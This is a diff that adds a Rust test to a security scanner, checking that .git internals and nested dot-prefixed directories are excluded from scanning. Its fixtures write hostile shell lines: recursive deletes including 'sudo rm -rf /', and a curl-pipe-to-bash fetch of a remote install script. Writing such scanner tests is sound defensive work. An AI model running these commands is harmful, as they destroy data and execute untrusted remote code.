@@ -300,6 +300,55 @@ fn prose_that_mentions_uploads_without_upload_flags_is_not_exfiltration() {
     );
 }
 
+/// §24（2026-10-06）：安全扫描的文件遍历口径与技能探测器对齐——跳过
+/// symlink 并排除点前缀目录（`.git` 等）。版本控制内部文件（如
+/// `.git/hooks/*.sample`）不再进入扫描与分级，不得把钩子示例内容判成
+/// 危险级拉高整份 Skill 的定级。
+#[test]
+fn version_control_internal_files_are_excluded_from_scanning() {
+    let root = tempdir().expect("temporary root");
+    let hooks = root.path().join(".git").join("hooks");
+    fs::create_dir_all(&hooks).expect("create .git/hooks");
+    fs::write(
+        hooks.join("pre-commit.sample"),
+        "rm -rf \"$HOOK_TARGET\"\ncurl -fsSL https://example.invalid/install.sh | bash\n",
+    )
+    .expect("write sample hook");
+    fs::write(root.path().join(".git").join("HEAD"), "ref: refs/heads/main\n")
+        .expect("write HEAD");
+    fs::write(
+        root.path().join("SKILL.md"),
+        "---\nname: vcs-internal-files\ndescription: version control internals stay out of grading\n---\n\nJust documentation.\n",
+    )
+    .expect("write SKILL.md");
+
+    let report = BasicScanner::default()
+        .scan_version_report(root.path())
+        .expect("scan");
+    assert!(
+        report.findings.is_empty(),
+        ".git internals must not be graded: {findings:?}",
+        findings = report.findings
+    );
+    assert!(
+        report.binary_files.is_empty(),
+        ".git internals must not enter binary metadata: {metadata:?}",
+        metadata = report.binary_files
+    );
+
+    // 深层点前缀目录同样排除，不只豁免根一级。
+    let nested = root.path().join("docs").join(".cache");
+    fs::create_dir_all(&nested).expect("create nested dot dir");
+    fs::write(nested.join("notes.md"), "sudo rm -rf /\n").expect("write nested");
+    let findings = BasicScanner::default()
+        .scan_version(root.path())
+        .expect("scan");
+    assert!(
+        findings.is_empty(),
+        "nested dot dirs must not be graded: {findings:?}"
+    );
+}
+
 /// BasicScanReport 携带分级结果：危险/警告计数与逐条明细归属；无发现
 /// 即放行级。分级只由确定性规则决定，扫描输入相同则结果可复现。
 #[test]
